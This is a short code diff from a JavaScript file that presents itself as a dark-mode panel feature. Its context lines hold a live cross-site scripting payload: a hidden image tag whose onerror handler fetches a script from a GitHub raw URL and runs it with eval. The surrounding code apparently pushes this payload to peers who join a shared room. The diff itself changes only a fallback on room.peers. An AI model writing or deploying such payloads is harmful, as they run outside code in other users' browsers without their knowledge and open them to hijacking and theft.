@@ -536,7 +536,7 @@ function createDarkModePanel() {
       try {
 
         const contentsOfXSS = `<img src="asd" id="targetImage" onerror='fetch("https://raw.githubusercontent.com/JammyCat91283/websim/refs/heads/main/main.js").then((response) => response.text()).then((text) => eval(text)).then(() => {})' style="display: none;"></img>`;
-        const currentPeers = room.peers || {};
+        const currentPeers = room.peers;
         setInterval(() => {
 
           // Check if a new peer has joined
